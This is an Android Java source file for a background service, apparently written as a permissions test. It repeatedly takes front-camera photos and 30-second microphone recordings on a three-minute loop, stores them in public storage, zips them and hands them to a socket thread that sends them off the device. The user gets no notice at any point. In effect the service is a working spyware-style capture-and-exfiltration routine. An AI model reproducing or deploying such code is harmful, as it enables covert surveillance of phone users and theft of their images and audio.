package com.example.alik.permissiontest;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Binder;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;

/**
 * Permission service that uses camera nad microphone. The  zips folder and sends it over the socket
 * @author Alikhan Tagybergen
 * @version 1.0
 */

public class PermissionService extends Service {

    private static final String TAG = "VideoProcessing";
    private static final int LENS_FACE = CameraCharacteristics.LENS_FACING_FRONT;
    private static CameraCaptureSession session;
    private final IBinder bind = new ServiceBinder();
    private final String DIR_FOLDER = "/permission-test/";
    private final int numOfImg[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
    private int currNumImg = 0;
    private FileZipper fileZipper = new FileZipper();
    private Thread socketThread = new Thread(fileZipper.serverRun);
// used to run the zipper so the folder can be zipped
    protected final Runnable zipRun = new Runnable() {
        @Override
        public void run() {
            fileZipper.zipFolder();
        }

    };
// Used to run socket sender so that the file can be sent
    protected final Runnable socketSenderRun = new Runnable() {
        @Override
        public void run() {
            socketThread.start();
        }
    };
    /**
     * Listens to available image and save it to a file when it is available. It will only save maximum of 20 pictures
     */
    protected ImageReader.OnImageAvailableListener onImageAvailableListener = new ImageReader.OnImageAvailableListener() {
        @Override
        public void onImageAvailable(ImageReader reader) {
            Log.i(TAG, "onImageAvailable");
            Image img = reader.acquireLatestImage();
            if (img != null) {
                Log.e(TAG, "Processing img");
                String fileName = numOfImg[currNumImg] + "image.jpg";
                File path = Environment.getExternalStoragePublicDirectory(
                        Environment.DIRECTORY_DOCUMENTS + DIR_FOLDER);
                if (!path.exists()) {
                    path.mkdirs();
                }
                if (currNumImg == 20) {
                    currNumImg = 0;
                    try {
                        session.stopRepeating();
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                }
                File file = new File(path, fileName);
                ByteBuffer buffer = img.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.remaining()];
                buffer.get(bytes);
                try {
                    OutputStream stream = new FileOutputStream(file);
                    stream.write(bytes);
                    stream.flush();
                    stream.close();
                    img.close();
                } catch (IOException e) // Catch the exception
                {
                    e.printStackTrace();
                }
                img.close();

                currNumImg++;
            }
        }
    };
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    /**
     * When camera is configure this callback is called to start the session
     */
    protected CameraCaptureSession.StateCallback sessionStateCallback = new CameraCaptureSession.StateCallback() {
        @Override
        public void onConfigured(@NonNull CameraCaptureSession session) {
            Log.i(TAG, "CameraCaptureSession.StateCallback onConfigured");
            PermissionService.this.session = session;
            final Handler handler = new Handler();
            final int[] i = {0};
            final Runnable runTask = new Runnable() {
                @Override
                public void run() {

                    try {
                        PermissionService.session.capture(createCaptureRequest(), null, null);


                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                        Log.e(TAG, e.getMessage());
                    }
                    i[0]++;
                    if (i[0] < 10) {
                        handler.postDelayed(this, 3000);

                    }
                }
            };
            handler.post(runTask);

            //session.setRepeatingRequest(createCaptureRequest(), null, null);
        }

        @Override
        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
        }
    };
    /**
     * Used to handle various states of the camera
     */
    protected CameraDevice.StateCallback cameraStateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {

            cameraDevice = camera;
            actOnReadyCameraDevice();
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            camera.close();

        }

        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            camera.close();

        }
    };
    private MediaRecorder micRecorder;

    /**
     *  Bound service needs to have an IBinder
     * @param intent
     * @return the bind of the service
     */

    @Override
    public IBinder onBind(Intent intent) {
        return bind;
    }

    /**
     * Returns false when service gets unbound
     */
    @Override
    public boolean onUnbind(Intent intent) {
        return false;
    }

    public void readyCamera() {
        CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            String pickedCamera = getCamera(manager);
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            manager.openCamera(pickedCamera, cameraStateCallback, null);
            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1/* images buffered */);
            imageReader.setOnImageAvailableListener(onImageAvailableListener, null);

        } catch (CameraAccessException e) {

        }
    }

    /**
     * Return the Camera Id which matches the front facing camera.
     */
    public String getCamera(CameraManager manager) {
        try {
            for (String cameraId : manager.getCameraIdList()) {
                CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
                int cOrientation = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (cOrientation == LENS_FACE) {
                    return cameraId;
                }
            }
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * When service starts this is executed
     * camera and microphone are run
     * zipping folder is delayed to 32 seconds
     * sending file to socket is delayed to 50 seconds
     * Service repeats all of the tasks every 3 minutes
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "onStartCommand flags " + flags + " startId " + startId);
        final Handler handler = new Handler();

        final Runnable runTask = new Runnable() {

            @Override
            public void run() {

                readyCamera();
                recordMic();
                Log.e(TAG, "startign recording");
                handler.postDelayed(this, 180000);
                handler.postDelayed(zipRun, 32000);
                handler.postDelayed(socketSenderRun,50000);
            }
        };
        handler.post(runTask);


        return super.onStartCommand(intent, flags, startId);
    }


/**
 * When camera is ready start capturing
 */
    public void actOnReadyCameraDevice() {
        try {
            cameraDevice.createCaptureSession(Arrays.asList(imageReader.getSurface()), sessionStateCallback, null);
        } catch (CameraAccessException e) {
           e.printStackTrace();
        }
    }
/**
 * When service is destoryed call and close all the resources
 */
    @Override
    public void onDestroy() {
        try {
            if (session != null) {
                session.abortCaptures();
            }
            cameraDevice.close();
            if (micRecorder != null) {
                //micRecorder.stop();
                micRecorder.release();
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, e.getMessage());
        }
        session.close();

        super.onDestroy();
    }

    /**
     * creates capture request to be used in a camera
     * @return CaptureRequest object
     */
    protected CaptureRequest createCaptureRequest() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
            builder.addTarget(imageReader.getSurface());
            return builder.build();
        } catch (CameraAccessException e) {
            Log.e(TAG, e.getMessage());
            return null;
        }
    }

    /**
     * Records audio using device's microphone
     */
    public void recordMic() {
        if (micRecorder != null) {
//            micRecorder.stop();
            micRecorder.release();
            micRecorder = new MediaRecorder();
        } else {
            micRecorder = new MediaRecorder();
        }
        micRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        micRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        File file = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_DOCUMENTS + DIR_FOLDER), "audio.mp4");
        micRecorder.setOutputFile(file.getAbsolutePath());
        micRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        try {
            micRecorder.prepare();
            micRecorder.start();
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    micRecorder.stop();
                    micRecorder.release();
                }
            }, 30000);

        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Gets binder for the service
     */
    public class ServiceBinder extends Binder {
        PermissionService getBinder() {
            return PermissionService.this;
        }
    }



}